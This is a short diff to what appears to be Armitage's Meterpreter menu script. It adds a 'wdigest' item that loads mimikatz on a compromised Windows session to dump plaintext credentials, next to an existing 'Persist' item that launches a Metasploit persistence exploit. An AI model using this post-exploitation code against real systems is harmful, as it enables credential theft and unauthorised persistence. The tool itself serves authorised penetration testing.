@@ -216,6 +216,15 @@ sub showMeterpreterMenu {
 			}, \$sid));
 		}, $sid => "$sid"));
 
+		item($h, "wdigest", 'w', lambda({
+			local('$m $f');
+			$m = createMeterpreterTab($sid);
+			[$m append: "\Umeterpreter\U> wdigest\n"];
+			$f = lambda(&wdigest_callback, \$m);
+			m_cmd_callback($sid, "use mimikatz", {});
+			m_cmd_callback($sid, "wdigest", $f);
+		}, $sid => "$sid"));
+
 		item($j, "Persist", 'P', lambda({
 			thread(lambda({
 				launch_dialog("Persistence", "exploit", "windows/local/persistence", 1, $null, %(SESSION => $sid, STARTUP => "SYSTEM"));
